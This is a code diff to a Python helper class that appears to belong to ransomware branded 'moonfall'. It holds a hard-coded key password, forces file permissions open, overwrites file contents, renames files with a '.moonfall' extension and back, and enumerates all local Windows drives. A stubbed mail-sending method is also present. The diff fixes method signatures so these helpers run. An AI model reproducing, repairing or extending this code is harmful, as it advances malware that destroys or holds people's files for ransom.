@@ -4,10 +4,6 @@ import platform
 import win32api
 
 class Utils():
-
-    def __init__(self):
-        pass
-    
     BRAND_NAME = 'moonfall'
     BRAND_EXT = '.moonfall'
 
@@ -40,10 +36,10 @@ class Utils():
 
     KEY_PASSWORD = 'key_FILE_passw0rd!'
 
-    def get_file_extension(full_path):
+    def get_file_extension(self, full_path):
         return os.path.splitext(full_path)[1]
 
-    def save_data(full_path, data, opt='add_ext'):
+    def save_data(self, full_path, data, opt='add_ext'):
         if not os.access(full_path, os.W_OK):
             oschmod.set_mode(full_path, "a+rwx,g-w,o-x")
             if not os.access(full_path, os.W_OK):
@@ -53,13 +49,13 @@ class Utils():
             file.write(data)
 
         if opt == 'add_ext':
-            os.rename(full_path, full_path + BRAND_EXT)
+            os.rename(full_path, full_path + self.BRAND_EXT)
         elif opt == 'del_ext':
-            os.rename(full_path, full_path[:-len(BRAND_EXT)])
+            os.rename(full_path, full_path[:-len(self.BRAND_EXT)])
         else:
             raise ValueError('Invalid argument')
 
-    def load_data(full_path):
+    def load_data(self, full_path):
         if not os.access(full_path, os.R_OK):
             oschmod.set_mode(full_path, "a+rwx,g-w,o-x")
             if not os.access(full_path, os.R_OK):
@@ -68,12 +64,12 @@ class Utils():
         with open(full_path, 'rb') as file:
             return file.read()
 
-    def is_windows():
+    def is_windows(self):
         return platform.system() == 'Windows'
 
-    def get_local_drives():
+    def get_local_drives(self):
         return win32api.GetLogicalDriveStrings().split('\000')[:-1]
 
-    def send_mail_message():
+    def send_mail_message(self):
         pass
 
